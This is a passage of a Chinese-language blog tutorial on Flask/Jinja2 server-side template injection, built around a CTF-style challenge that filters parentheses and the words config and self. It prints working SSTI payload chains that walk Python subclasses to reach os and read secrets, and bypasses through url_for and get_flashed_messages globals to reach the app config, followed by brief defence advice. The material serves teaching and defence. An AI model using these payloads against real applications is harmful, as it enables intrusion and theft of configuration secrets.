+    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
+        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{<!-- -->{% set {}=None% }}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>为了方便复现，增加了flag.txt文件，并将上述代码的第五行进行简单修改，修改如下：</p> 
+<pre><code class="prism language-python">app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>限制：过滤了()，和关键字config,self。<br> Config<br> config为flask 类的配置文件内容,config为字典。如果不过滤config,显示如下<br> <img src="https://images2.imgbox.com/53/50/5eYPrEVr_o.png" alt="在这里插入图片描述"></p> 
+<p>过滤以后的结果<br> <img src="https://images2.imgbox.com/d4/b1/VKAQ5NHf_o.png" alt="在这里插入图片描述"></p> 
+<p>self<br> self是类实例化对象，这里指app, dict：保存类实例或对象实例的属性变量键值对字典。<br> self在Python里不是关键字。self代表当前对象的地址。self能避免非限定调用造成的全局变量。<br> Python的类的方法和普通的函数有一个很明显的区别，在类的方法必须有个额外的第一个参数 (self )，但在调用这个方法的时候不必为这个参数赋值 （显胜于隐 的引发）。Python的类的方法的这个特别的参数指代的是对象本身，而按照Python的惯例，它用self来表示。（当然我们也可以用其他任何名称来代替，只是规范和标准在那建议我们一致使用self）<br> <img src="https://images2.imgbox.com/20/ed/qNzU1n3G_o.png" alt="在这里插入图片描述"></p> 
+<p><img src="https://images2.imgbox.com/aa/f3/lfqEQ4H7_o.png" alt="在这里插入图片描述"></p> 
+<p>如果没有过滤(),则可以通过通过subclasses()结合基类找到os模块来泄露flag，类似</p> 
+<pre><code class="prism language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span>
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span>
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span>
+</code></pre> 
+<p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。<br> 比如url_for和getflashed_messages的__globals中均含有current_app，那么获得current_app以后就可以直接访问config<br> url_for() 方法:<br> 比如通过urlfor._globals[‘current_app’].config<br> <img src="https://images2.imgbox.com/43/60/NpkpYgQh_o.png" alt="在这里插入图片描述"></p> 
+<p>url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。</p> 
+<p><img src="https://images2.imgbox.com/13/0b/4Z9GmR6j_o.png" alt="在这里插入图片描述"></p> 
+<p>get_flashed_messages() 方法：<br> 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。<br> 或者通过get_flashed_messages.__globals[‘current_app’].config</p> 
+<p><img src="https://images2.imgbox.com/11/da/a2b4nhyQ_o.png" alt="在这里插入图片描述"></p> 
+<p></p> 
+<h2><a id="__771"></a>第五章 如何防御服务器模板注入</h2> 
+<p>• 为了防止此类漏洞，你应该像使用eval()函数一样处理字符串加载功能。尽可能加载静态模板文件。<br> • 注意：我们已经确定此功能类似于require()函数调用。因此，你也应该防止本地文件包含（LFI）漏洞。不要允许用户控制此类文件或其内容的路径。<br> • 另外，无论在何时，如果需要将动态数据传递给模板，不要直接在模板文件中执行，你可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。</p> 
+<h2><a id="_777"></a>参考资料</h2> 
+<p>• 从零学习flask模板注入<br> • python-flask模块注入(SSTI)<br> • Flask（Jinja2） 服务端模板注入漏洞(SSTI)<br> • 钱游 Python Flask Web开发入门与项目实战<br> • Flask应用_w3cshool<br> • 服务器端模板注入(SSTI)<br> • Server-Side Template Injection Introduction &amp; Example<br> • 常见的web攻击方式之服务器端模板注入<br> • 服务端模板注入攻击 (SSTI) 之浅析<br> • CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】<br> • Flask Web 开发实战：入门、进阶与原理分析/李辉著.-北京：机械工业出版社,2018.8(Web开发技术丛书）<br> • Python dict属性详解</p> 
+<h2><a id="_792"></a>附录</h2> 
+<p>person = {<!-- --><br> ‘name’: ‘hello’,<br> ‘secret’: ‘7d793037a0760186574b0282f2f435e7’<br> }</p> 
+<p>for item in person:<br> print(item,person[item])</p> 
+<p>name hello<br> secret 7d793037a0760186574b0282f2f435e7</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/e9f76c9f5fefde8f02b8e2632980e8a6/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">数据中台架构实践</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/f131756d28b29a919a99286f76c7fa17/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">IDEA中maven项目dependencies报错飘红问题解决</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
